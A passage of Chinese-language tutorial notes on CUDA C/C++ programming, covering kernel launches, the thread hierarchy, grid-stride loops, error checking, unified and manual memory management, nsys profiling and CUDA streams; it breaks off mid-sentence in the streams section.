SPMD\uff08Single Program Multiple Data\uff0c\u5355\u4ee3\u7801\u591a\u6570\u636e\uff09\uff0c\u4e5f\u5c31\u662f MultiThreaded \u4ee5\u4ee5\u4e0b\u4ee3\u7801\u4e3a\u4f8b for ( int i = 0 ; i < N ; ++ i ) { C [ i ] = A [ i ] + B [ i ]; } SISD \uff08\u5355\u6307\u4ee4\u5355\u6570\u636e\uff09\uff1a\u6bcf\u5c42\u5faa\u73af\u662f load load add store\uff0c\u5faa\u73af N \u6b21 SIMD \uff08\u5355\u6307\u4ee4\u591a\u6570\u636e\uff09\uff1a\u5229\u7528 SIMD \u6307\u4ee4\uff0c\u51cf\u5c11\u5faa\u73af\u6b21\u6570\uff0c\u4e00\u6b21\u6307\u4ee4\u6267\u884c\u591a\u6b21\u5faa\u73af\uff0cload \u591a\u4e2a\u6570\u3001add \u591a\u6b21\u3001store \u591a\u6b21 SPMD \uff08\u5355\u4ee3\u7801\u591a\u6570\u636e\uff09\uff1a\u6267\u884c\u65f6\u5206\u4e3a\u591a\u4e2a thread\uff0c\u6bcf\u4e2a thread \u5904\u7406\u4e00\u6b21\u5faa\u73af\u7684\u6570\u636e CUDA \u00b6 nvidia-smi \u547d\u4ee4\u67e5\u770b GPU \u4fe1\u606f CUDA C/C++ \u6587\u4ef6\u6269\u5c55\u540d\u4e3a .cu\uff0c\u4f7f\u7528 nvcc \u7f16\u8bd1\u3002\u4e00\u4e2a CUDA \u4ee3\u7801\u7684\u4f8b\u5b50\uff1a void CPUFunction () { printf ( \"This function is defined to run on the CPU. \\n \" ); } __global__ void GPUFunction () { printf ( \"This function is defined to run on the GPU. \\n \" ); } int main () { CPUFunction (); GPUFunction <<< 1 , 1 >>> (); cudaDeviceSynchronize (); } \u5176\u4e2d\u4e00\u4e9b CUDA \u7279\u6709\u5185\u5bb9\u7684\u89e3\u91ca\uff1a __global__ void GPUFunction() __global__ \u5173\u952e\u5b57\u8868\u660e\u4ee5\u4e0b\u51fd\u6570\u5c06\u5728 GPU \u4e0a\u8fd0\u884c\u5e76\u53ef\u5168\u5c40\u8c03\u7528\uff0c\u800c\u5728\u6b64\u79cd\u60c5\u51b5\u4e0b\uff0c\u5219\u6307\u7531 CPU \u6216 GPU \u8c03\u7528 \u901a\u5e38\uff0c\u6211\u4eec\u5c06\u5728 CPU \u4e0a\u6267\u884c\u7684\u4ee3\u7801\u79f0\u4e3a\u4e3b\u673a\u4ee3\u7801\uff0c\u800c\u5c06\u5728 GPU \u4e0a\u8fd0\u884c\u7684\u4ee3\u7801\u79f0\u4e3a\u8bbe\u5907\u4ee3\u7801 \u4f7f\u7528 __global__ \u5173\u952e\u5b57\u5b9a\u4e49\u7684\u51fd\u6570\u9700\u8981\u8fd4\u56de void \u7c7b\u578b GPUFunction<<<1, 1>>>() \u901a\u5e38\uff0c\u5f53\u8c03\u7528\u8981\u5728 GPU \u4e0a\u8fd0\u884c\u7684\u51fd\u6570\u65f6\uff0c\u6211\u4eec\u5c06\u6b64\u79cd\u51fd\u6570\u79f0\u4e3a\u5df2\u542f\u52a8\u7684\u6838\u51fd\u6570 <<< ... >>> \u8bed\u6cd5\u63d0\u4f9b\u6267\u884c\u914d\u7f6e\uff0c\u5373\u7ebf\u7a0b\u5757\u7684\u6570\u91cf\u548c\u6bcf\u4e2a\u7ebf\u7a0b\u5757\u5185\u7684\u7ebf\u7a0b\u6570 cudaDeviceSynchronize() \u6838\u51fd\u6570\u542f\u52a8\u65b9\u5f0f\u4e3a\u5f02\u6b65\uff1aCPU \u4ee3\u7801\u5c06\u7ee7\u7eed\u6267\u884c\u800c\u65e0\u9700\u7b49\u5f85\u6838\u51fd\u6570\u5b8c\u6210\u542f\u52a8\u3002 \u8c03\u7528 CUDA \u8fd0\u884c\u65f6\u63d0\u4f9b\u7684\u51fd\u6570 cudaDeviceSynchronize \u53ef\u4ee5\u4f7f\u4e3b\u673a\uff08CPU\uff09\u4ee3\u7801\u6682\u4f5c\u7b49\u5f85\uff0c\u76f4\u81f3\u8bbe\u5907\uff08GPU\uff09\u4ee3\u7801\u6267\u884c\u5b8c\u6210\uff0c\u7136\u540e\u518d\u6062\u590d\u4e3b\u673a\u4ee3\u7801\u7684\u6267\u884c \u6574\u4e2a\u8c03\u7528 GPU \u7684\u5927\u81f4\u6d41\u7a0b\u4e3a\uff1a \u5148\u5728 CPU \u4e2d\u8fdb\u884c\u6b63\u5e38 main \u51fd\u6570\u4e2d\u7684\u5de5\u4f5c\uff08\u5373\u56fe\u4e2d initialize\uff09 \u7136\u540e CPU \u8c03\u7528 GPU \u6838\u51fd\u6570 performWork()\uff0c\u540c\u65f6 CPU \u4e2d\u7ee7\u7eed\u8fdb\u884c\u5b83\u8be5\u505a\u7684\u5176\u5b83\u5de5\u4f5c\uff08\u5373\u56fe\u4e2d cpuWork\uff09 CPU \u6267\u884c\u5b8c cpuWork() \u540e\u7ecf\u8fc7 cudaDeviceSynchronize() \u4e0e GPU \u540c\u6b65\uff0c\u963b\u585e\u5f53\u524d CPU \u4efb\u52a1\uff0c\u7b49\u5f85 GPU \u7684 performWork \u6267\u884c\u5b8c \u540c\u6b65\u540e CPU \u7ee7\u7eed\u6267\u884c\u5269\u4e0b\u7684 verifyWork() \u7f16\u8bd1 \u00b6 \u4f7f\u7528 nvcc \u8fdb\u884c\u7f16\u8bd1\uff0c\u4f8b\u5982\uff1a $ nvcc -arch = sm_70 -o out code.cu -run - \u4f7f\u7528 sm_70 \u67b6\u6784 - \u7f16\u8bd1 code.cu \u6587\u4ef6 - \u8f93\u51fa\u4e3a out \u53ef\u6267\u884c\u6587\u4ef6 - -run \u6807\u5fd7\u6807\u8bc6\u7f16\u8bd1\u5b8c\u7acb\u5373\u6267\u884c \u53e6\u5916\uff0c\u53ef\u4ee5\u4f7f\u7528 -std=c++11 \u6765\u6307\u5b9a C/C++ \u8bed\u8a00\u7248\u672c \u7ebf\u7a0b\u5c42\u6b21\u7ed3\u6784 \u00b6 \u6b63\u5982\u524d\u9762 1.1 \u63d0\u5230\uff0cCUDA \u7684\u7ebf\u7a0b\u5c42\u6b21\u7ed3\u6784\u4ece\u5927\u5230\u5c0f\u4e3a Grid -> Thread Block -> Thread \u7ed3\u6784\u793a\u610f\u56fe\uff1a \u6bcf\u4e2a\u7ebf\u7a0b\uff08Thread\uff09\u4e2d\u90fd\u8fd0\u884c\u4e00\u4efd\u6838\u51fd\u6570\u4e2d\u5185\u5bb9\uff0c\u591a\u4e2a\u7ebf\u7a0b\u7ec4\u6210\u4e00\u4e2a\u7ebf\u7a0b\u5757\uff08Thread Block\uff09\uff0c\u4e0e\u6838\u51fd\u6570\u542f\u52a8\u5173\u8054\u7684\u6240\u6709\u5757\u7ec4\u6210\u7f51\u683c\uff08Grid\uff09 \u542f\u52a8\u6838\u51fd\u6570\u65f6\u8fdb\u884c\u7684\u914d\u7f6e\u5c31\u662f <<< \u7ebf\u7a0b\u5757\u6570 , \u6bcf\u4e2a\u5757\u4e2d\u7ebf\u7a0b\u6570 >>>\uff0c\u5176\u4e2d\u6bcf\u5757\u4e2d\u7ebf\u7a0b\u6570\u4e00\u822c\u6700\u5927\u4e3a 1024 \u7ebf\u7a0b\u5c42\u6b21\u7ed3\u6784\u53d8\u91cf \u00b6 \u5728\u6838\u51fd\u6570\u4e2d\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee CUDA \u63d0\u4f9b\u7684\u7ebf\u7a0b\u5c42\u6b21\u7ed3\u6784\u53d8\u91cf\uff0c\u5e38\u7528\u7684\u6709\uff1a gridDim.x \uff1aGrid \u4e2d\u7684 Block \u6570 blockIdx.x \uff1a\u5f53\u524d Block \u5728 Grid \u4e2d\u7684\u7d22\u5f15 blockDim.x \uff1a\u6bcf\u4e2a Block \u4e2d\u7684 Thread \u6570 threadIdx.x \uff1a\u5f53\u524d Thread \u5728\u6240\u5728\u7684 Block \u4e2d\u7684\u7d22\u5f15 \u534f\u8c03\u5e76\u884c\u7ebf\u7a0b \u00b6 \u4f8b\u5982\u5e76\u884c\u52a0\u901f for \u5faa\u73af\uff0c\u4e3a\u4e86\u4f7f\u6bcf\u4e2a\u7ebf\u7a0b\u4e2d\u6838\u51fd\u6570\u5747\u5904\u7406\u4e0d\u540c\u7684 i\uff0c\u8bbf\u95ee\u5185\u5b58 arr[i]\uff0c\u53ef\u4ee5\u901a\u8fc7\u4e0a\u9762\u7684\u53d8\u91cf\u8fdb\u884c\u8ba1\u7b97\uff1a i = threadIdx . x + blockIdx . x * blockDim . x \u5373\u6bcf\u4e2a\u7ebf\u7a0b\u5904\u7406\u7684 i \u4e3a\uff1a \u4f46\u8fd9\u662f\u7406\u60f3\u60c5\u51b5\uff0c\u6709\u4e24\u79cd\u7279\u6b8a\u60c5\u51b5\u9700\u8981\u5904\u7406\uff1a \u603b\u7ebf\u7a0b\u6570\u591a\u4e8e\u8981\u5904\u7406\u7684\u6570\u636e\u6570\uff08\u6216\u8005\u8bf4\u5faa\u73af\u6b21\u6570\uff09\uff0c\u5219\u8fd9\u6837\u505a\u4f1a\u8bbf\u95ee\u5230\u975e\u6cd5\u5185\u5b58 \u603b\u7ebf\u7a0b\u6570\u5c11\u4e8e\u8981\u5904\u7406\u7684\u6570\u636e\u6570\uff0c\u5219\u8fd9\u6837\u505a\u4f1a\u5b58\u5728\u6ca1\u6709\u6267\u884c\u7684\u5faa\u73af \u5bf9\u4e8e\u7b2c\u4e00\u79cd\uff0c\u53ea\u9700\u8981\u5728\u8ba1\u7b97\u5f97\u5230 i \u4e4b\u540e\u4e0e\u603b\u6570 n \u6bd4\u8f83\uff0c\u5982\u679c i < n \u5219\u6267\u884c\uff0c\u5426\u5219\u5728\u8fd9\u4e2a\u7ebf\u7a0b\u5185\u4ec0\u4e48\u90fd\u4e0d\u505a \u5bf9\u4e8e\u7b2c\u4e8c\u79cd\uff0c\u5219\u9700\u8981\u6bcf\u4e2a\u7ebf\u7a0b\u6267\u884c\u4e0d\u6b62\u4e00\u4e2a\u5faa\u73af\u7684\u5de5\u4f5c\uff0c\u4e5f\u5c31\u662f\u4f7f\u7528 \u7f51\u683c\u8de8\u5ea6\u5faa\u73af \uff1a \u800c\u6bcf\u4e2a\u7ebf\u7a0b\u8fdb\u884c\u5faa\u73af\u7684\u8de8\u5ea6\u6070\u597d\u4e3a Grid \u4e2d\u7684\u603b\u7ebf\u7a0b\u6570\uff0c\u56e0\u4e3a gridDim.x \u8868\u793a Grid \u4e2d Block \u6570\uff0cblockDim.x \u8868\u793a\u6bcf\u4e2a Block \u4e2d Thread \u6570\uff0c\u6240\u4ee5\u8fd9\u4e2a\u8de8\u5ea6\u6070\u597d\u662f gridDim . x * blockDim . x \u56e0\u6b64 for \u5faa\u73af\u901a\u8fc7\u6838\u51fd\u6570\u5728 GPU \u4e2d\u5e76\u884c\u8fd0\u884c\u7684\u5e38\u7528\u5199\u6cd5\u662f\uff1a __global__ void kernel ( int * a , int N ) { int idx = threadIdx . x + blockIdx . x * blockDim . x ; int stride = gridDim . x * blockDim . x ; for ( int i = idx ; i < N ; i += stride ) { // a[i] ... } } \u4e8c\u7ef4\u548c\u4e09\u7ef4\u7684\u7f51\u683c\u548c\u5757 \u00b6 \u7f51\u683c\u548c\u7ebf\u7a0b\u5757\u6700\u591a\u53ef\u4ee5\u6709\u4e09\u4e2a\u7ef4\u5ea6\uff0c\u4f7f\u7528\u591a\u7ef4\u5ea6\u5b9a\u4e49\u7f51\u683c\u548c\u5757\u4e0d\u4f1a\u5bf9\u6027\u80fd\u9020\u6210\u5f71\u54cd\uff0c\u4f46\u662f\u5728\u5904\u7406\u591a\u7ef4\u6570\u636e\u65f6\u4f1a\u66f4\u65b9\u4fbf \u5b9a\u4e49\u4e8c\u7ef4\u6216\u4e09\u7ef4\u7684\u7f51\u683c\u548c\u5757\u53ef\u4ee5\u4f7f\u7528 CUDA \u63d0\u4f9b\u7684 dim3 \u7c7b\u578b\uff1a dim3 threadsPerBlock ( 16 , 16 , 1 ); dim3 numberOfBlocks ( 16 , 16 , 1 ); kernel <<< numberOfBlocks , threadsPerBlock >>> (...); \u5728\u6838\u51fd\u6570\u4e2d\uff0c gridDim . x gridDim . y blockDim . x blockDim . y \u5747\u4e3a 16 \u4e8c/\u4e09\u7ef4\u5faa\u73af\u7684\u5e76\u884c\u5904\u7406\u4e5f\u7c7b\u4f3c\u4e0a\u9762\u4e00\u7ef4\u60c5\u51b5\uff1a __global__ void kernel ( int ** a , int N1 , int N2 ) { int idxx = threadIdx . x + blockIdx . x * blockDim . x ; int stridex = gridDim . x * blockDim . x ; int idxy = threadIdx . y + blockIdx . y * blockDim . y ; int stridey = gridDim . y * blockDim . y ; for ( int i = idxx ; i < N1 ; i += stridex ) { for ( int j = idxy ; j < N2 ; j += stridey ) { // a[i][j] ... } } } \u9519\u8bef\u5904\u7406 \u00b6 \u8bb8\u591a CUDA \u51fd\u6570\u4f1a\u8fd4\u56de\u7c7b\u578b\u4e3a cudaError_t \u7684\u503c\uff0c\u6765\u7528\u4e8e\u540e\u7eed\u68c0\u67e5\u8c03\u7528\u51fd\u6570\u65f6\u662f\u5426\u53d1\u751f\u4e86\u9519\u8bef\uff0c\u6ca1\u6709\u9519\u8bef\u7684\u503c\u4e3a cudaSuccess \uff0c\u5982\u679c\u6709\u9519\u8bef\uff0c\u53ef\u4ee5\u901a\u8fc7 cudaGetErrorString \u6765\u83b7\u53d6\u9519\u8bef\u7684\u5177\u4f53\u5185\u5bb9\u3002\u4ee5 cudaMallocManaged \u4e3a\u4f8b\uff1a cudaError_t err ; err = cudaMallocManaged ( & a , N ); if ( err != cudaSuccess ) { printf ( \"Error: %s \\n \" , cudaGetErrorString ( err )); } \u4f46\u6838\u51fd\u6570\u6ca1\u6709\u8fd4\u56de\u503c\uff0c\u56e0\u6b64\u68c0\u67e5\u542f\u52a8\u6838\u51fd\u6570\u65f6\u662f\u5426\u53d1\u751f\u9519\u8bef\uff08\u4f8b\u5982\u542f\u52a8\u914d\u7f6e\u9519\u8bef\uff09\u9700\u8981\u4f7f\u7528 CUDA \u63d0\u4f9b\u7684 cudaGetLastError \u51fd\u6570\uff1a kernel <<< 1 , -1 >>> (); cudaError_t err ; err = cudaGetLastError ; if ( err != cudaSuccess ) { printf ( \"Error: %s \\n \" , cudaGetErrorString ( err )); } \u800c\u4e3a\u4e86\u6355\u83b7\u5f02\u6b65\u9519\u8bef\uff08\u5982\u5728\u6838\u51fd\u6570\u6267\u884c\u671f\u95f4\u51fa\u73b0\u7684\u9519\u8bef\uff09\uff0c\u5219\u9700\u8981\u68c0\u67e5 cudaDeviceSynchronize \u7684\u8fd4\u56de\u503c\uff0c\u4e00\u4e2a\u5b9e\u7528\u5199\u6cd5\u662f\uff1a #include <assert.h> inline cudaError_t checkCuda ( cudaError_t result ) { if ( result != cudaSuccess ) { fprintf ( stderr , \"CUDA Runtime Error: %s \\n \" , cudaGetErrorString ( result )); assert ( result == cudaSuccess ); } return result ; } int main () { ... kernel <<< ..., ... >>> (...); checkCuda ( cudaGetLastError ()); checkCuda ( cudaDeviceSynchronize ()); ... } \u5206\u914d\u5185\u5b58 \u00b6 C \u5206\u914d\u5185\u5b58\u4f7f\u7528\u7684\u662f malloc \u51fd\u6570\uff0c\u4f46\u901a\u8fc7 malloc \u5f97\u5230\u7684\u5185\u5b58\u53ea\u80fd\u5728 CPU \u4e2d\u8bbf\u95ee \u9700\u8981\u5728 CPU \u548c GPU \u4e2d\u540c\u65f6\u8bbf\u95ee\u67d0\u5185\u5b58\uff0c\u9700\u8981\u901a\u8fc7 cudaMallocManaged \u51fd\u6570\u6765\u5206\u914d\uff0c\u5373\uff1a int * a ; size_t size = n * sizeof ( int ); a = ( int * ) malloc ( size ) -> cudaMallocManaged ( & a , size ) \u7136\u540e\u91ca\u653e\u5185\u5b58\u65f6\u4f7f\u7528 cudaFree \u4ee3\u66ff free\uff0c\u5373 cudaFree(a) \u6ce8\u610f\uff1a\u5229\u7528 cudaMallocManaged \u5206\u914d\u7684\u5185\u5b58\u53ef\u4ee5\u5728 CPU \u548c GPU \u4e2d\u4f7f\u7528\uff08\u540e\u9762\u4f1a\u8bf4\uff09\uff0c\u5229\u7528 cudaMalloc \u5206\u914d\u7684\u5185\u5b58\u53ea\u53ef\u4ee5\u5728 GPU \u4e2d\u4f7f\u7528 nsys \u6027\u80fd\u5206\u6790 \u00b6 nsys\uff08Nsight System\uff09\u662f CUDA \u5de5\u5177\u5305\u9644\u5e26\u7684\u6027\u80fd\u5206\u6790\u5668\uff0c\u53ef\u4ee5\u6267\u884c\u7a0b\u5e8f\u5e76\u751f\u6210\u5305\u542b GPU \u6d3b\u52a8\u3001CUDA API \u8c03\u7528\u3001\u5185\u5b58\u6d3b\u52a8\u7b49\u4fe1\u606f\u7684\u62a5\u544a\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 GUI \u67e5\u770b\u65f6\u95f4\u8f74 nsys \u4f7f\u7528\u53ea\u9700\u8981\u6307\u5b9a nvcc \u7f16\u8bd1\u597d\u7684\u53ef\u6267\u884c\u6587\u4ef6\u5373\u53ef\uff1a $ nsys profile --stats = true ./out - \u4f7f\u7528 nsys profile \u8fdb\u884c\u5206\u6790 - --stats=true \u8868\u793a\u5411\u547d\u4ee4\u884c\u4e2d\u6253\u5370\u6458\u8981\u4fe1\u606f - \u5206\u6790 out \u7a0b\u5e8f \u4e5f\u53ef\u4ee5\u4f7f\u7528 -o \u6307\u5b9a\u62a5\u544a\u8f93\u51fa\u6587\u4ef6\uff0c\u8fd9\u4e2a\u6587\u4ef6\u53ef\u4ee5\u4f7f\u7528 Nsight System GUI \u8f6f\u4ef6\u6253\u5f00\u8fdb\u884c\u5206\u6790 nsys \u9ed8\u8ba4\u4e0d\u4f1a\u8986\u76d6\u539f\u6709\u62a5\u544a\uff0c\u9700\u8981\u8986\u76d6\u8981\u4f7f\u7528 CLI flag --force-overwrite=true \u6d41\u591a\u5904\u7406\u5668 \u00b6 \u6d41\u591a\u5904\u7406\u5668\uff08SM\uff0cStreaming Multiprocessor\uff09\u662f\u8fd0\u884c CUDA \u7684 GPU \u4e0a\u7684\u5904\u7406\u5355\u5143 \u5728\u6838\u51fd\u6570\u6267\u884c\u671f\u95f4\uff0c\u7ebf\u7a0b\u5757\u4f1a\u63d0\u4f9b\u7ed9 SM \u8fdb\u884c\u6267\u884c\uff0c\u56e0\u6b64\u4e3a\u4e86\u652f\u6301 GPU \u6267\u884c\u5c3d\u53ef\u80fd\u591a\u7684\u5e76\u884c\u64cd\u4f5c\uff0c\u63d0\u9ad8 SM \u7684\u5229\u7528\u7387\u8fdb\u800c\u63d0\u9ad8\u6027\u80fd\uff0c\u4e00\u822c\u5c06\u7ebf\u7a0b\u5757\u6570\uff08\u4e5f\u5c31\u662f\u7f51\u683c\u7ef4\u5ea6\uff09\u6307\u5b9a\u4e3a SM \u6570\u91cf\u7684\u500d\u6570 \u6b64\u5916\uff0cSM \u4f1a\u5728\u540d\u4e3a Warp \u7684\u7ebf\u7a0b\u5757\u5185\u521b\u5efa\u3001\u7ba1\u7406\u3001\u8c03\u5ea6\u3001\u6267\u884c\u5305\u542b 32 \u4e2a\u7ebf\u7a0b\u7684\u7ebf\u7a0b\u7ec4\uff0c\u56e0\u6b64\u4e00\u822c\u4e5f\u5c06\u7ebf\u7a0b\u6570\u91cf\u6307\u5b9a\u4e3a 32 \u7684\u500d\u6570 \u67e5\u8be2 GPU \u8bbe\u5907\u5c5e\u6027 \u00b6 CUDA \u63d0\u4f9b\u4e86\u83b7\u53d6\u5f53\u524d\u5904\u4e8e\u6d3b\u8dc3\u72b6\u6001\u7684 GPU \u8bbe\u5907\u5c5e\u6027\u7684 API\uff1a int deviceId ; cudaGetDevice ( & deviceId ); cudaDeviceProp props ; cudaGetDeviceProperties ( & props , deviceId ); \u5176\u4e2d cudaGetDevice \u83b7\u53d6\u8bbe\u5907 id\uff0c cudaDeviceProp \u4e3a\u5c5e\u6027\u7684\u7ed3\u6784\u7c7b\u578b\uff0c cudaGetDeviceProperties \u6839\u636e\u8bbe\u5907 id \u83b7\u53d6\u5177\u4f53\u5c5e\u6027 \u6240\u6709\u5c5e\u6027\u89c1\uff1a NVIDIA CUDA \u8fd0\u884c\u65f6\u6587\u6863 \u7ed3\u5408\u4e0a\u9762\uff0c\u4e00\u822c\u8bbe\u7f6e\u5757\u6570\u548c\u7ebf\u7a0b\u6570\u4f7f\u7528\uff1a int deviceId ; int numberOfSMs ; cudaGetDevice ( & deviceId ); cudaDeviceGetAttribute ( & numberOfSMs , cudaDevAttrMultiProcessorCount , deviceId ); size_t threadsPerBlock = 256 ; size_t numberOfBlocks = 32 * numberOfSMs ; \u7edf\u4e00\u5185\u5b58 \u00b6 \u4f7f\u7528 cudaMallocManaged \u5206\u914d\u7684\u5185\u5b58\u4e3a\u7edf\u4e00\u5185\u5b58\uff08UM\uff0cUnified Memory\uff09 \u7edf\u4e00\u5185\u5b58\u5728 CPU \u548c GPU \u5206\u522b\u8bbf\u95ee\u65f6\u7684\u884c\u4e3a\u5982\u4e0b\uff1a \u521a\u5f00\u59cb\u65f6\u5206\u914d\u7684\u5185\u5b58\u4e0d\u5728 CPU \u4e0a\u4e5f\u4e0d\u5728 GPU \u4e0a \u54ea\u4e00\u65b9\u5148\u8bbf\u95ee\uff0c\u4f1a\u9020\u6210\u4e00\u4e2a\u9875\u9519\u8bef\uff08page fault\uff09\uff0c\u7136\u540e\u5c06\u9700\u8981\u7684\u5185\u5b58\u8fc1\u79fb\u5230\u81ea\u5df1\u8eab\u4e0a \u53e6\u4e00\u65b9\u8bbf\u95ee\u65f6\u4e5f\u4f1a\u9020\u6210\u9875\u9519\u8bef\uff0c\u7136\u540e\u518d\u5c06\u9700\u8981\u7684\u5185\u5b58\u8fc1\u79fb\u5230\u81ea\u5df1\u8eab\u4e0a \u6570\u636e\u4ece\u4e3b\u673a\u5230\u8bbe\u5907\u7684\u8fc1\u79fb\u8bb0\u4e3a HtoD\uff0c\u4ece\u8bbe\u5907\u5230\u4e3b\u673a\u7684\u8fc1\u79fb\u8bb0\u4e3a DtoH\uff0c\u901a\u8fc7 nsys \u53ef\u4ee5\u770b\u5230\u8fd9\u4e9b\u8f6c\u79fb\u64cd\u4f5c \u5728\u7a00\u758f\u8bbf\u95ee\u6a21\u5f0f\u60c5\u51b5\u4e0b\uff0c\u8fd9\u6837\u53ef\u4ee5\u6309\u9700\u8fc1\u79fb\u5185\u5b58\uff0c\u5c24\u5176\u662f\u5728\u591a\u4e2a GPU \u52a0\u901f\u7cfb\u7edf\u4e2d\uff0c\u8fd9\u6837\u7684\u6309\u9700\u8fc1\u79fb\u4f1a\u6709\u663e\u8457\u4f18\u52bf \u6709\u65f6\u53ef\u4ee5\u5c06\u5185\u5b58\u521d\u59cb\u5316\u653e\u5728 GPU \u4e2d\u8fdb\u884c\uff0c\u8fd9\u6837 UM \u4f1a\u5148\u8fc1\u79fb\u5230 GPU \u4e2d\uff0c\u7136\u540e\u9a7b\u7559\u5728 GPU \u91cc\u8fdb\u884c\u540e\u9762\u7684\u8ba1\u7b97\u64cd\u4f5c\uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u5728\u4e3b\u673a\u548c\u8bbe\u5907\u4e4b\u95f4\u7684\u8fc1\u79fb\u6b21\u6570\uff0c\u63d0\u9ad8\u6548\u7387 \u5f02\u6b65\u5185\u5b58\u9884\u53d6 \u00b6 \u4f46\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff08\u6bd4\u5982\u9700\u8981\u8fde\u7eed\u5927\u7247\u5185\u5b58\uff09\uff0c\u5219\u9884\u5148\u5c06\u5185\u5b58\u8fc1\u79fb\u51fa\u6765\u53ef\u4ee5\u89c4\u907f\u9875\u9519\u8bef\uff0c\u5e76\u4e14\u51cf\u5c11\u6309\u9700\u5185\u5b58\u8fc1\u79fb\u7684\u6210\u672c CUDA \u53ef\u901a\u8fc7 cudaMemPrefetchAsync \u51fd\u6570\u6765\u5c06 UM \u9884\u53d6\u5230\u67d0\u4e00\u8bbe\u5907\u4e2d\uff0c\u6bd4\u5982\uff1a int deviceId ; cudaGetDevice ( & deviceId ); cudaMemPrefetchAsync ( pointerToSomeUMData , size , deviceId ); ... cudaMemPrefetchAsync ( pointerToSomeUMData , size , cudaCpuDeviceId ); cudaMemPrefetchAsync \u9700\u8981\u63d0\u4f9b UM \u7684\u6307\u9488\u3001\u5927\u5c0f\u3001\u4ee5\u53ca\u8981\u9884\u53d6\u5230\u7684\u8bbe\u5907\u3002\u5176\u4e2d deviceId \u901a\u8fc7 cudaGetDevice \u83b7\u53d6\uff0ccudaCpuDeviceId \u662f CUDA \u5185\u7f6e\u53d8\u91cf\uff0c\u8868\u793a CPU \u624b\u52a8\u5185\u5b58\u5206\u914d \u00b6 \u4e00\u4e9b\u624b\u52a8\u5185\u5b58\u7ba1\u7406\u7684 CUDA \u51fd\u6570\uff1a cudaMalloc \uff1a\u76f4\u63a5\u4e3a GPU \u5206\u914d\u5185\u5b58\uff0c\u9632\u6b62\u51fa\u73b0 GPU \u5206\u9875\u9519\u8bef\uff0c\u4f46\u662f CPU \u65e0\u6cd5\u8bbf\u95ee\u5f97\u5230\u7684\u5185\u5b58\u6307\u9488 cudaMallocHost \uff1a\u76f4\u63a5\u4e3a CPU \u5206\u914d\u5185\u5b58\uff0c\u79f0\u4e3a\u56fa\u5b9a\u5185\u5b58\uff08pinned memory\uff09\u6216\u9875\u9501\u5b9a\u5185\u5b58\uff08page-locked memory\uff09\uff0c\u5141\u8bb8\u5c06\u5185\u5b58\u5f02\u6b65\u62f7\u8d1d\u5230 GPU \u6216\u4ece GPU \u5f02\u6b65\u62f7\u8d1d\u56de\u6765\u3002\u4f46\u56fa\u5b9a\u5185\u5b58\u8fc7\u591a\u4f1a\u5e72\u6270 CPU \u6027\u80fd\u3002\u91ca\u653e\u65f6\u4f7f\u7528 cudaFreeHost cudaMemcpy \uff1a\u4e3b\u673a\u4e0e\u8bbe\u5907\u4e4b\u95f4\u62f7\u8d1d\u5185\u5b58 cudaMemcpyAsync \uff1a\u4e3b\u673a\u4e0e\u8bbe\u5907\u4e4b\u95f4\u5f02\u6b65\u62f7\u8d1d\u5185\u5b58 \u793a\u4f8b\uff1a int * host_a , * device_a ; // Define host-specific and device-specific arrays. cudaMalloc ( & device_a , size ); // `device_a` is immediately available on the GPU. cudaMallocHost ( & host_a , size ); // `host_a` is immediately available on CPU, and is page-locked, or pinned. initializeOnHost ( host_a , N ); // No CPU page faulting since memory is already allocated on the host. // `cudaMemcpy` takes the destination, source, size, and a CUDA-provided variable for the direction of the copy. cudaMemcpy ( device_a , host_a , size , cudaMemcpyHostToDevice ); kernel <<< blocks , threads , 0 , someStream >>> ( device_a , N ); // `cudaMemcpy` can also copy data from device to host. cudaMemcpy ( host_a , device_a , size , cudaMemcpyDeviceToHost ); verifyOnHost ( host_a , N ); cudaFree ( device_a ); cudaFreeHost ( host_a ); // Free pinned memory like this. \u5e76\u53d1 CUDA \u6d41 \u00b6 \u5728 CUDA \u4e2d\uff0c\u6838\u51fd\u6570\u7684\u6267\u884c\u4ee5\u53ca\u4e00\u4e9b\u5185\u5b58\u4f20\u8f93\u5747\u5728 CUDA \u6d41\uff08CUDA Streams\uff09\u4e2d\u8fdb\u884c\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u76f4\u63a5\u542f\u52a8\u6838\u51fd\u6570\u4f1a\u5728\u9ed8\u8ba4\u6d41\u4e2d\u6267\u884c \u5728\u6bcf\u4e00\u4e2a\u6d41\u4e2d\uff0c\u4e0d\u540c\u7684\u6838\u51fd\u6570\u5206\u522b\u6267\u884c\uff1b\u4f46\u5728\u4e0d\u540c\u6d41\u4e2d\uff0c\u53ef\u4ee5\u5e76\u53d1\u6267\u884c\u591a\u4e2a\u6838\u51fd\u6570 CUDA \u6d41\u884c\u4e3a\u7684\u51e0\u9879\u89c4\u5219\uff1a \u7ed9\u5b9a\u6d41\u4e2d\u7684\u6240\u6709\u64cd\u4f5c\u6309\u5e8f\u6267\u884c \u4e0d\u540c\u975e\u9ed8\u8ba4\u6d41\u4e2d\u7684\u64cd\u4f5c\u65e0\u6cd5\u4fdd\u8bc1\u5f7c\u6b64\u4e4b\u95f4\u7684\u6267\u884c\u987a\u5e8f \u9ed8\u8ba4\u6d41\u6709\u963b\u65ad\u80fd\u529b\uff0c\u5373\u5b83\u4f1a\u7b49\u5f85\u5176\u5b83\u5df2\u5728\u8fd0\u884c\u7684\u6240\u6709\u6d41\u5b8c\u6210\u5f53\u524d\u64cd\u4f5c\u4e4b\u540e\u624d\u4f1a\u8fd0\u884c\uff0c\u5e76\u4e14\u5728\u81ea\u8eab\u8fd0\u884c\u5b8c\u6bd5\u4e4b\u540e\u5176\u4ed6\u6d41\u624d\u53ef\u4ee5\u7ee7\u7eed\u4e0b\u4e00\u64cd\u4f5c\u7684\u8fd0\u884c \u4e5f\u5c31\u662f\uff1a \u6838\u51fd\u6570\u5728\u5404\u6d41\u4e2d\u6267\u884c\u7684\u60c5\u51b5\u4e5f\u53ef\u4ee5\u901a\u8fc7 nsys \u53ef\u89c6\u5316\u5206\u6790\u770b\u51fa\u6765 \u521b\u5efa\u3001\u4f7f\u7528\u3001\u9500\u6bc1\u975e\u9ed8\u8ba4\u6d41 \u00b6 CUDA \u4e2d\u6d41\u7684\u7c7b\u578b\u4e3a cudaStream_t \uff0c\u5e76\u4e14\u5229\u7528 cudaStreamCreate 